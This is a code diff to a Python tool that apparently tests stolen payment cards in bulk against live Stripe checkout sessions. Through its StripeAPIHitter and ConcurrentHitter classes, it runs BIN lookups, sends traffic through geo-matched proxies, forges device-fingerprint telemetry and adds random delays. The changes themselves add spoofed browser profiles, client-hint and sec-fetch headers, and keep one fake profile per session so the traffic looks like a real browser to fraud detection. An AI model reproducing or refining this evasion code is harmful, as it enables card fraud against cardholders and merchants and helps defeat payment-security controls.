@@ -33,9 +33,40 @@ MAX_ATTEMPTS = 10
 CONCURRENT_BATCH_SIZE = 10  # Worker pool size
 BATCH_DELAY = 5
 
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+BROWSER_PROFILES = [
+    {
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "impersonate": "chrome124",
+        "platform": "Win32",
+        "color_depth": "32",
+        "screen_height": "1080",
+        "screen_width": "1920",
+        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"'
+    },
+    {
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "impersonate": "chrome124",
+        "platform": "MacIntel",
+        "color_depth": "30",
+        "screen_height": "1050",
+        "screen_width": "1680",
+        "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"macOS"'
+    },
+    {
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "impersonate": "chrome120",
+        "platform": "Win32",
+        "color_depth": "24",
+        "screen_height": "1440",
+        "screen_width": "2560",
+        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"'
+    },
 ]
 
 STRIPE_DECLINE_CODES = {
@@ -80,7 +111,19 @@ class StripeAPIExtractor:
     async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str) -> Dict:
         try:
             url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
-            headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
+            profile = random.choice(BROWSER_PROFILES)
+            headers = {
+                "authority": "api.stripe.com",
+                "accept": "application/json",
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": profile["user_agent"],
+                "sec-fetch-dest": "empty",
+                "sec-fetch-mode": "cors",
+                "sec-fetch-site": "same-site"
+            }
+            if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
+            if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
+            if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
             data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
             proxy_data = await ProxyManager.get_random(user_id)
             proxies = None
@@ -797,12 +840,13 @@ class StripeAPIHitter:
         StripeAPIHitter._live_js_hash_cache = "da394b0aef"
         return StripeAPIHitter._live_js_hash_cache
 
-    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
+    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None, profile: dict = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
         self.proxy_data = proxy_data
         self.raw_amount = raw_amount
         self.locked_email = locked_email
+        self.profile = profile or random.choice(BROWSER_PROFILES)
 
     async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
         """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
@@ -921,42 +965,7 @@ class StripeAPIHitter:
         start = time.time()
         result = {'attempt': attempt, 'card': card, 'success': False, 'decline_code': None, 'response_time': 0, 'amount': None, 'merchant': None, 'proxy_raw': None, 'error': None, 'raw_response': None}
         
-        BROWSER_PROFILES = [
-            {
-                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-                "impersonate": "chrome124",
-                "platform": "Win32",
-                "color_depth": "32",
-                "screen_height": "1080",
-                "screen_width": "1920",
-                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
-                "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": '"Windows"'
-            },
-            {
-                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-                "impersonate": "chrome124",
-                "platform": "MacIntel",
-                "color_depth": "30",
-                "screen_height": "1050",
-                "screen_width": "1680",
-                "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124", "Google Chrome";v="124"',
-                "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": '"macOS"'
-            },
-            {
-                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                "impersonate": "chrome120",
-                "platform": "Win32",
-                "color_depth": "24",
-                "screen_height": "1440",
-                "screen_width": "2560",
-                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                "sec-ch-ua-mobile": "?0",
-                "sec-ch-ua-platform": '"Windows"'
-            },
-        ]
-        profile = random.choice(BROWSER_PROFILES)
+        profile = self.profile
         
         # BIN Intelligence — identify card country/bank before hitting
         bin_info = await BINLookup.lookup(card['card'])
@@ -991,7 +1000,10 @@ class StripeAPIHitter:
                     "content-type": "application/x-www-form-urlencoded",
                     "origin": origin_url,
                     "referer": checkout_page_url,
-                    "user-agent": profile["user_agent"]
+                    "user-agent": profile["user_agent"],
+                    "sec-fetch-dest": "empty",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-site": "same-site"
                 }
                 if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
                 if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
@@ -1774,6 +1786,7 @@ class ConcurrentHitter:
         # All cards in the same session share the same muid/sid/guid, just like a real browser
         self._stripe_tokens: dict = {}
         self._stripe_tokens_ts: float = 0.0
+        self._stripe_profile: dict = None
         
     async def _fetch_fresh_session(self) -> dict:
         """Re-fetch the reusable URL to mint a fresh cs_live + pk_live pair.
@@ -1965,8 +1978,10 @@ class ConcurrentHitter:
                             except Exception:
                                 pass
                     
+                    if not self._stripe_profile:
+                        self._stripe_profile = random.choice(BROWSER_PROFILES)
                     proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email)
+                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email, profile=self._stripe_profile)
                     
                     import random
                     await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
